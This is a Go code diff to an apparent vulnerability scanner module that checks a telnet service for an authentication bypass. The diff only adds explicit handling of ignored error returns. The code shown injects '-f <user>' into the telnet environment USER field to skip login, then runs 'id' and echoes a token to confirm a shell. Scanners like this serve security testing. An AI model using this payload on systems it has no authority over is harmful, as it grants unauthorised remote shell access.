@@ -810,7 +810,7 @@ func (e *cveChecker) sendPayload() {
 	payload = append(payload, 1) // SEND indicator
 	payload = append(payload, []byte("-f "+e.user)...)
 	payload = append(payload, telnetIAC, telnetSE)
-	e.conn.Write(payload)
+	_, _ = e.conn.Write(payload)
 	e.exploitSent = true
 }
 
@@ -819,7 +819,7 @@ func (e *cveChecker) sendSubResp(opt byte, data []byte) {
 	resp := []byte{telnetIAC, telnetSB, opt, 0}
 	resp = append(resp, data...)
 	resp = append(resp, telnetIAC, telnetSE)
-	e.conn.Write(resp)
+	_, _ = e.conn.Write(resp)
 }
 
 // parseIAC 解析 Telnet IAC 协商报文,返回非 IAC 数据部分
@@ -883,20 +883,20 @@ func (e *cveChecker) parseIAC(data []byte) []byte {
 			switch cmd {
 			case telnetDO:
 				if opt == 24 || opt == 32 || opt == telnetNEWENVIRON {
-					e.conn.Write([]byte{telnetIAC, telnetWILL, opt})
+					_, _ = e.conn.Write([]byte{telnetIAC, telnetWILL, opt})
 				} else {
-					e.conn.Write([]byte{telnetIAC, telnetWONT, opt})
+					_, _ = e.conn.Write([]byte{telnetIAC, telnetWONT, opt})
 				}
 			case telnetWILL:
 				if opt == 1 || opt == 3 {
-					e.conn.Write([]byte{telnetIAC, telnetDO, opt})
+					_, _ = e.conn.Write([]byte{telnetIAC, telnetDO, opt})
 				} else {
-					e.conn.Write([]byte{telnetIAC, telnetDONT, opt})
+					_, _ = e.conn.Write([]byte{telnetIAC, telnetDONT, opt})
 				}
 			case telnetWONT:
-				e.conn.Write([]byte{telnetIAC, telnetDONT, opt})
+				_, _ = e.conn.Write([]byte{telnetIAC, telnetDONT, opt})
 			case telnetDONT:
-				e.conn.Write([]byte{telnetIAC, telnetWONT, opt})
+				_, _ = e.conn.Write([]byte{telnetIAC, telnetWONT, opt})
 			}
 		}
 	}
@@ -907,7 +907,7 @@ func (e *cveChecker) parseIAC(data []byte) []byte {
 func (e *cveChecker) readAll() []byte {
 	var out []byte
 	for {
-		e.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
+		_ = e.conn.SetReadDeadline(time.Now().Add(1 * time.Second))
 		n, err := e.conn.Read(e.buf)
 		if err != nil {
 			break
@@ -922,7 +922,7 @@ func (e *cveChecker) readAll() []byte {
 // genToken 生成 16 位随机验证 token
 func (e *cveChecker) genToken() string {
 	b := make([]byte, 8)
-	rand.Read(b)
+	_, _ = rand.Read(b)
 	return fmt.Sprintf("%x", b)
 }
 
@@ -943,7 +943,7 @@ func (e *cveChecker) extractEvidence(data string, keywords []string) string {
 // 优先级: id 命令 > echo token > shell prompt 特征
 func (e *cveChecker) run() (bool, string, string) {
 	// 阶段 1: IAC 协商
-	e.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
+	_ = e.conn.SetReadDeadline(time.Now().Add(5 * time.Second))
 	for {
 		n, err := e.conn.Read(e.buf)
 		if err != nil {
@@ -960,7 +960,7 @@ func (e *cveChecker) run() (bool, string, string) {
 		e.sendPayload()
 		time.Sleep(500 * time.Millisecond)
 		for {
-			e.conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+			_ = e.conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
 			n, err := e.conn.Read(e.buf)
 			if err != nil || n == 0 {
 				break
@@ -970,7 +970,7 @@ func (e *cveChecker) run() (bool, string, string) {
 	}
 
 	// 阶段 2: id 命令检测 (多次读取确保完整输出)
-	e.conn.Write([]byte("id\n"))
+	_, _ = e.conn.Write([]byte("id\n"))
 	time.Sleep(1500 * time.Millisecond)
 
 	var idOutput string
@@ -993,7 +993,7 @@ func (e *cveChecker) run() (bool, string, string) {
 
 	// 阶段 3: echo token 验证
 	token := e.genToken()
-	e.conn.Write([]byte("echo " + token + "\n"))
+	_, _ = e.conn.Write([]byte("echo " + token + "\n"))
 	time.Sleep(1 * time.Second)
 
 	result := string(e.readAll())
